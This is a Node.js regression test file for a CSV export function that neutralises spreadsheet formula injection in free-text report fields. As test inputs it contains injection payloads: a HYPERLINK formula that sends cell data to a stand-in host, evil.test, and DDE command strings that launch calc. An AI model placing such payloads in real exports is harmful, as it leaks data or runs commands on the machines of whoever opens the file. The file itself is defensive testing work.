// Run: node --test lib/csv.test.mjs
//
// SECURITY REGRESSION — CSV / Excel formula injection (SEC-012).
//
// Customer names, retailer names, device models and remarks are free text that
// retailers type in. Every report export writes them into a CSV. A cell whose
// value starts with =, +, -, @, TAB or CR is executed as a FORMULA by Excel,
// LibreOffice and Google Sheets when the exported report is opened.
//
// These tests pin BOTH halves of the fix:
//   1. dangerous leading characters are neutralised, and
//   2. legitimate report values — especially NEGATIVE numbers, which are all
//      over the profit/deficit columns — are left EXACTLY as they were.
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { readFileSync } from 'node:fs';
import path from 'node:path';
import { fileURLToPath } from 'node:url';
import ts from 'typescript';
import Module from 'node:module';

const __dirname = path.dirname(fileURLToPath(import.meta.url));

function loadTs(absPath, cache = new Map()) {
  if (cache.has(absPath)) return cache.get(absPath).exports;
  const src = readFileSync(absPath, 'utf8');
  const js = ts.transpileModule(src, {
    compilerOptions: { module: ts.ModuleKind.CommonJS, target: ts.ScriptTarget.ES2019 },
  }).outputText;
  const m = { exports: {} };
  cache.set(absPath, m);
  const req = (spec) => {
    let resolved = spec;
    if (spec.startsWith('@/lib/')) resolved = path.join(__dirname, spec.slice('@/lib/'.length));
    else if (spec.startsWith('./') || spec.startsWith('../')) resolved = path.resolve(path.dirname(absPath), spec);
    else return Module.createRequire(absPath)(spec);
    if (!/\.[tj]s$/.test(resolved)) resolved += '.ts';
    return loadTs(resolved, cache);
  };
  new Function('exports', 'require', 'module', '__dirname', '__filename', js)(
    m.exports, req, m, path.dirname(absPath), absPath,
  );
  return m.exports;
}

const { csvCell, csvRow, buildCsv } = loadTs(path.join(__dirname, 'csv.ts'));

// ── 1. Attack payloads must not stay executable ─────────────────────────────

test('formula payloads are neutralised with a leading quote', () => {
  // Classic data-exfiltration payload in a customer name.
  assert.equal(csvCell('=HYPERLINK("http://evil.test?x="&A1,"click")'),
    '"\'=HYPERLINK(""http://evil.test?x=""&A1,""click"")"');

  // All five dangerous lead characters.
  assert.equal(csvCell('=cmd|calc'), "'=cmd|calc");
  assert.equal(csvCell('+1+1'), "'+1+1");
  assert.equal(csvCell('@SUM(1:99)'), "'@SUM(1:99)");
  assert.equal(csvCell('\tinjected'), '"\'\tinjected"');
  assert.equal(csvCell('\rinjected'), '"\'\rinjected"');
});

test('DDE-style payload in a retailer name is neutralised', () => {
  const out = csvCell('=cmd|\'/c calc\'!A0');
  assert.ok(out.includes("'="), 'formula lead must be escaped');
  assert.ok(!/^=/.test(out), 'cell must not begin with a bare =');
});

test('neutralised cell is no longer a formula after CSV parsing', () => {
  // Simulate what a spreadsheet sees: strip RFC4180 quoting, then check the
  // first character is not a formula trigger.
  const raw = '=1+1';
  let cell = csvCell(raw);
  if (cell.startsWith('"')) cell = cell.slice(1, -1).replace(/""/g, '"');
  assert.equal(cell[0], "'");
});

// ── 2. Legitimate report data must be byte-identical ────────────────────────

test('negative amounts are NOT altered (deficit / profit columns)', () => {
  // These start with '-' but are real numbers. Mangling them would corrupt
  // every deficit and profit figure in the reports.
  assert.equal(csvCell('-500'), '-500');
  assert.equal(csvCell('-1234.56'), '-1234.56');
  assert.equal(csvCell(-500), '-500');
  assert.equal(csvCell('+250'), '+250');
  assert.equal(csvCell('-0'), '-0');
  assert.equal(csvCell('1.5e-9'), '1.5e-9');
});

test('ordinary report values pass through unchanged', () => {
  assert.equal(csvCell('RAJESH KUMAR'), 'RAJESH KUMAR');
  assert.equal(csvCell('Redmi 5A'), 'Redmi 5A');
  assert.equal(csvCell('2025-01-05'), '2025-01-05');
  assert.equal(csvCell(12000), '12000');
  assert.equal(csvCell(''), '');
  assert.equal(csvCell(null), '');
  assert.equal(csvCell(undefined), '');
  // The IMEI columns already prefix their own apostrophe — must not double up.
  assert.equal(csvCell("'111111111111111"), "'111111111111111");
});

test('RFC4180 quoting still applies to commas, quotes and newlines', () => {
  assert.equal(csvCell('SMITH, JOHN'), '"SMITH, JOHN"');
  assert.equal(csvCell('say "hi"'), '"say ""hi"""');
  assert.equal(csvCell('line1\nline2'), '"line1\nline2"');
});

test('a name containing a comma cannot break out into extra columns', () => {
  const row = csvRow(['SMITH, JOHN', '9000000001', '1000']);
  assert.equal(row, '"SMITH, JOHN",9000000001,1000');
  // Exactly 3 fields survive a naive split-on-comma-outside-quotes parse.
  assert.equal(row.match(/(".*?"|[^,]*)/g).filter(s => s !== '').length, 3);
});

test('buildCsv keeps header, BOM and row order intact', () => {
  const csv = buildCsv({
    header: ['Customer', 'Amount'],
    rows: [{ Customer: '=evil()', Amount: -500 }, { Customer: 'OK NAME', Amount: 1000 }],
  });
  const lines = csv.split('\r\n');
  assert.ok(lines[0].endsWith('Customer,Amount'));
  assert.equal(lines[1], "'=evil(),-500");   // payload defused, amount intact
  assert.equal(lines[2], 'OK NAME,1000');
});
